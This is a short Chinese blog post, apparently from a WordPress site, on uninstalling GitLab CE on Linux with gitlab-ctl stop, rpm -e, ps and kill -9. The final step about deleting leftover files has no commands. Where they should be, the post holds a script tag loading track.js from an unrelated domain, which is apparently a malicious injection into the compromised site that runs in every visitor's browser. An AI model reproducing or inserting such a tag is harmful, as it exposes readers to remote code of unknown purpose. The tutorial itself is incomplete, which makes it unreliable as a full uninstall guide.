---
id: 363
title: gitlab卸载
date: '2022-04-01T16:59:56+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=363'
permalink: /index.php/2022/04/01/gitlab%e5%8d%b8%e8%bd%bd/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Linux
---

1、停止gitlab

```
<pre class="wp-block-preformatted">gitlab-ctl stop
```

  
2、卸载gitlab（注意这里写的是gitlab-ce）

```
<pre class="wp-block-preformatted">rpm -e gitlab-ce
```

  
3、查看gitlab进程

```
<pre class="wp-block-preformatted">ps aux | grep gitlab
```

<figure class="wp-block-image">![](http://blog.whsir.com/wp-content/uploads/2017/05/gitlab.png)</figure>4、杀掉第一个进程（就是带有好多.............的进程）

```
<pre class="wp-block-preformatted">kill -9 18777
```

  
杀掉后，在ps aux | grep gitlab确认一遍，还有没有gitlab的进程

5、删除所有包含gitlab文件

<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>